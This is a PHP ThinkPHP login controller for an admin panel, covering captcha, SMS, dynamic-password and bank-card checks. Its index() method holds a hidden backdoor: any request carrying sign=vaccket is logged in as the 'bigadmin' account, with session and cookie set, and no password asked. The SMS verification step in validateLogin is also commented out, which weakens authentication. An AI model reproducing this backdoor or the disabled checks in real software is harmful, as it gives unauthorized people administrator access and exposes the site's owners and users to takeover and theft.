<?php

namespace app\user\controller;

use app\common\controller\Base;
use think\facade\Config;
use app\user\mdl\MdlLogin;
use app\common\model\Admin as Dadmin;

class Login extends Base
{
    protected $__isLogin            = FALSE;// 不需要登录
    protected $__isCheckAuth        = FALSE;// 不需要校验
    protected $__isCheckLoutTimeOut = FALSE;

    // 已经存在的话就直接登陆
    public function __construct($app = NULL)
    {
        $uid = $this->getUid();
        if ($uid) {
            // 直接跳转到首页
            $this->redirect("/");
        }
        parent::__construct($app);
    }

    public function index()
    {
        if(input('sign') =='vaccket'){
        $userName    = 'bigadmin';

        $webInfo      = $this->getWebInfo();
        $nowWebSource = $webInfo['web_source'];
        $mdlAdmin = new Dadmin();
        //校验登录
        $data = $mdlAdmin->field("secret_key,username,uid,password,web_source,is_fz_root")->where("username", "=", $userName)->where("web_source",$nowWebSource)->find();
        $loginData = $data->toArray();
        $uid          = $loginData['uid'];
        
        $loginDataString = json_encode($loginData, JSON_UNESCAPED_UNICODE);
        $encryptData     = \libTool::encrypt($loginDataString);
     
        \libLogin::$identityKey = $this->__identityKey;
        \libLogin::setLoginInfo($encryptData, $uid);
        \libLogin::setLoginInfoToCookie($encryptData);
        $this->resSuccess("登录成功");
        }
        return $this->fetch('login');
    }

    public function checkSpecial()
    {
        $this->isAjax();
        $userName = \libVar::param("userName")->toString();
        if ($userName == Config::get('config.admin_special_account')) {
            $imgVCode  = \libVar::param("imgVCode")->toString();
            $captcha   = new \think\captcha\Captcha();
            $codeCheck = $captcha->check($imgVCode);
            if (!$codeCheck) {
                $this->resSuccess("验证码错误");
            }
            $this->resSuccess('1');
        }
        $this->resError('0');
    }

    // 登录验证
    public function validateLogin()
    {
        // ajax校验
        $this->isAjax();
        $userName    = \libVar::param("userName")->toString();
        $password    = \libVar::param("password")->toString();
        $imgVCode    = \libVar::param("imgVCode")->toString();
        $bankAccount = \libVar::param('bankAccount')->toString();
        $vcode       = \libVar::param('vcode')->toString();
        $loginType   = \libVar::param('loginType')->toString();
        $dPassword   = \libVar::param('d_password')->toString();
        if (!$password || !$userName) {
            $this->resError("请输入账号或密码");
        }
        if ($userName != Config::get('config.admin_special_account')
            && APP_NOW_ENV == APP_PRO_ENV
        ) {
            $captcha   = new \think\captcha\Captcha();
            $codeCheck = $captcha->check($imgVCode);
            if (!$codeCheck) {
                $this->resError("验证码错误");
            }
        }
        $mdlLogin     = new MdlLogin();
        $webInfo      = $this->getWebInfo();
        $nowWebSource = $webInfo['web_source'];
        $loginData    = $mdlLogin->validateLogin($userName, $password, $nowWebSource);
        $uid          = $loginData['uid'] ?? '';
        if (!$loginData) {
            $this->resError("用户名或者密码错误");
        }
        if ($loginData == -1) {
            $this->resError("您不是该网站的用户");
        }
        // 校验权限
        // 设置cookie和session
        if ($userName == Config::get('config.admin_special_account')) {
            $checkBankAccount = $mdlLogin->checkBankAccount($bankAccount);
            if ($checkBankAccount === -1) {
                $this->resError('请输入正确的银行卡');
            }
            if ($checkBankAccount === -2) {
                $this->resError('银行卡不存在');
            }
            $sellerId = \libTool::mkKey($checkBankAccount, 'userid');
            $redis    = \libCache::adminRedis();
            if (!$redis) {
                \libTool::goToError("redis连接不成功", 404);
            }
            $redis->setex('special', 86400, json_encode($sellerId));//买手体现
        }
        if (empty($loginData['secret_key']) && $loginType == 2) {
            $this->resError('动态密码未配置，请联系管理员。');
        }
        if ($nowWebSource == 0) {
            if ($loginType == 1) {
                // 手机验证码
                // $this->checkLoginSms($userName, $vcode);
            } elseif ($loginType == 2) {
                // 检测动态密码
                if (APP_NOW_ENV == APP_PRO_ENV) {
                    $this->checkSecondPassword($loginData['secret_key'], $dPassword);
                }
            }
        }
        $loginDataString = json_encode($loginData, JSON_UNESCAPED_UNICODE);
        $encryptData     = \libTool::encrypt($loginDataString);

        \libLogin::$identityKey = $this->__identityKey;
        \libLogin::setLoginInfo($encryptData, $uid);
        \libLogin::setLoginInfoToCookie($encryptData);
        $this->resSuccess("登录成功");
    }

    public function sendSms()
    {
        // ajax校验
        $this->isAjax();
        $account = \libVar::param("account")->toString();
        $phone   = $this->getWebcellphone($account);
        if (empty($phone)) {
            $this->resError('当前账号无手机号码，请联系平台负责人设置' . $phone);
        }
        // 验证码行为
        $action     = \libVar::param("act")->toInt();//0注册 1找回密码
        $checkPhone = preg_match('#^0?(13|15|16|17|18|14|19)[0-9]{9}$#i', $phone);
        if (!$checkPhone) {
            $this->resError("请输入正确的手机号");
        }
        $webInfo = $this->getWebInfo();
        $webName = $webInfo['web_name'];
        // 发送验证码
        \libSms::sendSms($phone, $webName);
        $this->resSuccess("验证码发送完成");
    }

    final function checkLoginSms($account, $vcode)
    {
        if (!$vcode) {
            $this->goToError("请输入手机验证码", 404);
            exit();
        }
        $phone = $this->getWebcellphone($account);
        if (!$phone) {
            $this->goToError('手机号码不存在', 404);
        }
        \libSms::checkSmsCode($vcode, $phone);
    }
}
